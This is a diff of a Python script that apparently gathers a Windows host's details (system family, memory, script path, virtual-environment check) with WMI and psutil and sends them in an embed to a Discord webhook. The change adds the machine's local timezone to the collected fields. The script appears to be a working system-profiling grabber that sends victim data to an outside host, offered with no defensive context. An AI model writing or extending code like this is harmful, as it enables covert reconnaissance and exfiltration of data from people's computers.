@@ -1,8 +1,3 @@
-
-# author: suegdu
-
-
-
 from requests import get
 from discord_webhook import DiscordEmbed,DiscordWebhook
 import platform
@@ -12,11 +7,15 @@ import sys
 import time
 import wmi
 import psutil
-
+import datetime
 c = wmi.WMI()   
 my_system = c.Win32_ComputerSystem()[0]
 time2 = time.time()
 sr = uname()
+now = datetime.datetime.now()
+local_now = now.astimezone()
+local_tz = local_now.tzinfo
+local_tzname = local_tz.tzname(local_now)
 if hasattr(sys, 'real_prefix'):
     st = True
 else:
@@ -51,6 +50,7 @@ def sg():
  embed.add_embed_field(name="SystemFamily :",value=f" {my_system.SystemFamily}")
  embed.add_embed_field(name="Memory :",value=f" {psutil.virtual_memory()}")
  embed.add_embed_field(name="Path :", value=f"**{sys.argv[0]}**", inline=True)
+ embed.add_embed_field(name="Local Timezone :", value=f"**{local_tzname}**", inline=True)
  embed.set_footer(text=f"{time2}", icon_url="https://static.thenounproject.com/png/2256517-200.png")
  webhook.add_embed(embed)
  response = webhook.execute()
@@ -58,3 +58,4 @@ def sg():
 
 if __name__ == "__main__":
  sg()
+
